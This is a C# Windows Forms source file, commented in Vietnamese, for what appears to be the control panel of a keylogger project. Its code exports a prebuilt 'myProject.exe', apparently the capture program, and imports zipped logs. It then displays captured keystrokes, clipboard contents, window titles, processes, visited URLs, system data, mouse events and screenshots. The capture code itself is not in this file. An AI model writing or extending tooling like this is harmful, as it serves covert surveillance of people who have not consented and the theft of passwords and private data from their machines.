using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Windows.Forms;

namespace KeyLogger
{
    public partial class MainForm : Form
    {
        private Dictionary<string, List<string>> logs = new Dictionary<string, List<string>>();
        private List<Image> screenshots = new List<Image>();

        public MainForm()
        {
            InitializeComponent();

            // Gán sự kiện cho các nút
            BtnExportExe.Click += BtnExportExe_Click;
            BtnImportLog.Click += (s, e) => ImportZipLog();
        }

        // Export file EXE
        private void BtnExportExe_Click(object sender, EventArgs e)
        {
            try
            {
                string exePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "myProject.exe");

                if (!File.Exists(exePath))
                {
                    MessageBox.Show("Không tìm thấy file myProject.exe trong thư mục bin\\Debug!");
                    return;
                }

                SaveFileDialog sfd = new SaveFileDialog
                {
                    Filter = "Executable File (*.exe)|*.exe",
                    FileName = "myProject.exe"
                };

                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    File.Copy(exePath, sfd.FileName, true);
                    MessageBox.Show("Xuất file thành công tới:\n" + sfd.FileName);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Lỗi khi xuất file: " + ex.Message);
            }
        }

        // Nhập log từ file ZIP
        private void ImportZipLog()
        {
            OpenFileDialog ofd = new OpenFileDialog { Filter = "Zip files (*.zip)|*.zip" };
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                string tempExtract = Path.Combine(Path.GetTempPath(), "KeyLoggerImport");

                if (Directory.Exists(tempExtract))
                    Directory.Delete(tempExtract, true);

                Directory.CreateDirectory(tempExtract);
                ZipFile.ExtractToDirectory(ofd.FileName, tempExtract);

                LoadLogs(tempExtract);
                MessageBox.Show("Keylogger imported successfully!!!");
            }
        }

        // Load tất cả logs
        private void LoadLogs(string folder)
        {
            string[] logTypes = { "Log", "Clipboard", "Window", "Process", "URL", "System", "Mouse" };
            logs.Clear();

            foreach (var type in logTypes)
            {
                var file = Directory.GetFiles(folder, $"{type}_*.txt").FirstOrDefault();
                logs[type] = file != null ? File.ReadAllLines(file).ToList() : new List<string>();

                // Hiển thị trên tab nếu có
                if (TabPages.ContainsKey(type))
                {
                    var dgv = TabPages[type].Controls.OfType<DataGridView>().FirstOrDefault();
                    if (dgv != null)
                    {
                        dgv.DataSource = logs[type]
                            .Select((v, i) => new { Index = i + 1, Content = v })
                            .ToList();
                    }
                }
            }

            // Load ảnh screenshots
            screenshots.Clear();
            string imageFolder = Directory.GetDirectories(folder, "Image_*").FirstOrDefault();

            if (imageFolder != null)
            {
                ImagePanel.Controls.Clear();

                foreach (var filePath in Directory.GetFiles(imageFolder, "*.png").OrderBy(f => f))
                {
                    Image img;
                    using (var temp = new Bitmap(filePath)) // tránh bị lock file
                    {
                        img = new Bitmap(temp);
                    }

                    screenshots.Add(img);

                    var pb = new PictureBox
                    {
                        Image = img,
                        SizeMode = PictureBoxSizeMode.Zoom,
                        Width = 240,
                        Height = 180,
                        Margin = new Padding(10),
                        Cursor = Cursors.Hand
                    };

                    // Sự kiện mở popup khi click ảnh
                    pb.Click += (s, e) =>
                    {
                        var popup = new Form
                        {
                            Text = "Xem ảnh",
                            StartPosition = FormStartPosition.CenterScreen,
                            Size = new Size(1000, 700),
                            FormBorderStyle = FormBorderStyle.Sizable
                        };

                        var fullPicture = new PictureBox
                        {
                            Image = ((PictureBox)s).Image,
                            Dock = DockStyle.Fill,
                            SizeMode = PictureBoxSizeMode.Zoom
                        };

                        popup.Controls.Add(fullPicture);
                        popup.ShowDialog();
                    };

                    ImagePanel.Controls.Add(pb);
                }
            }
        }
    }
}
